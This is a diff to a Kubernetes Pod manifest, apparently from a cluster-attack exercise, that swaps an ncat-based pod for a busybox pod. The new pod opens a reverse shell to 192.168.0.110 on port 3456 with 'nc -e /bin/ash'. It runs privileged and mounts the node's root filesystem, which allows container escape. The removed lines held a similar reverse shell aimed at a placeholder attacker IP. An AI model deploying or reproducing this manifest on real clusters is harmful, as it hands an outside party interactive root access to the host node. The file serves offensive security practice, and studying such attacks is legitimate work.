@@ -1,12 +1,30 @@
+# pod with reverse she]l
 apiVersion: v1
 kind: Pod
 metadata:
-  name: rs-pod
+  name: busybox
   namespace: dev
-  labels:
-    app: ncat
 spec:
   containers:
-    - name: rs-pod
-      image: raesene/ncat
-      args: ["IP_ADDRESS", "3456", "-e", "/bin/bash"] # IP address is attacker IP, change it
+    - name: busybox
+      image: busybox
+      stdin: true
+      tty: true
+      command:
+        - /bin/nc
+        - "192.168.0.110"
+        - "3456"
+        - "-e"
+        - /bin/ash
+        - "-i"
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - mountPath: /host
+          name: hostvolume
+  volumes:
+    - name: hostvolume
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
